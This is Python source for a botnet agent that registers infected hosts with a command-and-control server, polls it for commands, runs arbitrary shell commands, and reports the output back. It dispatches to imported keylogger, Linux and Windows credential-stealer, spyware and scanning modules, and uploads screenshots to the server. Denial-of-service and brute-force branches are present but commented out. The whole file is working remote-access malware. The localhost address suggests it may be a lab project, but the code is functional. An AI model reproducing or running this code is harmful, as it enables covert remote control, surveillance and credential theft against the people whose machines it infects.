import requests
import subprocess
import time
import uuid
import threading
import platform
import socket
import os
import DoS
import port_scan as ps
import net_scan as ns
import Keylogger as kl
import linux_stealer as lsl
import windows_stealer as wsl
import spyware as spy
import BruteForce_Module as bf

# C2_URL = "http://10.10.135.88:5000"
C2_URL = "http://127.0.0.1:5000"
WHOAMI = subprocess.getoutput("whoami")
SEMAPHORE = threading.Semaphore(7)

# as mac is unique address so made it into bod_id
def get_bot_id():
    ip = ps.get_ip()
    mac = ps.get_mac_for_ip(ip)
    if mac:
        bot_id = mac.replace(":", "").lower()
    else:
        bot_id = str(uuid.uuid4().int)[:10]
    return bot_id

BOT_ID = get_bot_id()

def register():
    while True:
        try:
            payload = {
                "id": BOT_ID,
                "whoami": WHOAMI,
                "os": platform.system(),
                "hostname": socket.gethostname(),
                "platform": platform.platform()
            }
            requests.post(f"{C2_URL}/register", json=payload)
            sleep = 60
        except Exception as e:
            sleep = 5
            sleep = min(sleep * 1.2, 300)
            print(f"[!] Registration failed: {e}")
        time.sleep(sleep)


def get_commands():
    try:
        res = requests.get(f"{C2_URL}/get_command/{BOT_ID}", timeout=10)
        data = res.json()
        return data.get("cmds", []), data.get("sent_at", "")
    except Exception as e:
        print(f"[!] Failed to fetch command: {e}")
        return [], ""

def report(output, cmd, sent_at):
    try:
        requests.post(f"{C2_URL}/report", json={
            "id": BOT_ID,
            "cmd": cmd,
            "output": output,
            "sent_at": sent_at
        })
    except Exception as e:
        print(f"[!] Failed to report: {e}")
        
        
# for sending screenshots from spyware to c2 server
def send_screenshot_to_c2(screenshot_path, command, sent_at):
    try:
        file_name = os.path.basename(screenshot_path)
        files = {'file': open(screenshot_path, 'rb')}
        data = {
            'command': command,
            'sent_at': sent_at,
            'file_name': file_name
        }
        response = requests.post(f"{C2_URL}/upload/{BOT_ID}", files=files, data=data)
        if response.status_code == 200:
            url = response.text.strip()
            print(f"[✓] Uploaded screenshot to: {url}")
            return f"[✓] Screenshot URL: {url}"
        else:
            return f"[x] Upload failed with status {response.status_code}"
    except Exception as e:
        return f"[!] Upload error: {e}"

def run_command(cmd, sent_at):
    def task():
        with SEMAPHORE:
            try:
                if cmd == "port_scan":
                    output = ps.main()
                elif cmd == "net_scan":
                    output = ns.AccurateScanner().run()
                # elif cmd.startswith("bruteforce"):
                #     parts = cmd.split()
                #     output = bf.main(*parts[1:])
                elif cmd.startswith("keylogger"):
                    parts = cmd.split()
                    output = kl.main(*parts[1:])
                elif cmd == "stealer":
                    if platform.system() == "Linux":
                        output = lsl.main()
                    elif platform.system() == "Windows":
                        output = wsl.main()
                    else:
                        output = "[!] Unsupported platform for stealer"
                elif cmd == "spyware":
                    output = spy.main()
                    # Split by newline
                    lines = output.strip().split('\n')

                    # Assume the screenshot path is on the last line
                    screenshot = lines[-1] if lines else None
                    files= screenshot.strip().split(" ")
                    file_path = files[-1] if files else None

                    send_screenshot_to_c2(file_path,command="spyware",sent_at=sent_at)
                # elif cmd.startwith("ddos"):
                #     parts = cmd.split()
                #     _,target_ip, target_port, num_packets, delay, num_threads = parts
                #     output = DoS.DoSSimulator.start_attack(target_ip, target_port, num_packets, delay, num_threads)
                else:
                    output = subprocess.getoutput(cmd)
            except Exception as e:
                output = f"[!] Error executing {cmd}: {e}"

            report(output, cmd, sent_at)

    threading.Thread(target=task).start()
    
# if c2 server is disconnected and want to connect again wake signal is sent (assuming c2 server has bot data and bot data hasn't changed)
# here bot is running all the time
def check_wake_signal():
    while True:
        try:
            res = requests.get(f"{C2_URL}/wake/{BOT_ID}")
            if res.status_code == 200 and res.json().get("wake") == True:
                print("[*] Wake signal received. Re-registering.")
                register()
        except:
            pass
        time.sleep(10)


def main_loop():
    # making sure that checking of wake signal is happening all the time
    threading.Thread(target=check_wake_signal, daemon=True).start()
    
    # making sure the bot re registers its data, for updating new data and making sure the connection is present
    threading.Thread(target=register, daemon=True).start()

    while True:
        cmds, sent_at = get_commands()

        if not cmds:
            time.sleep(5)
            continue

        for cmd in cmds:
            print(f"[+] Received: {cmd} (sent at: {sent_at})")
            run_command(cmd, sent_at)

        time.sleep(5)

if __name__ == "__main__":
    main_loop()
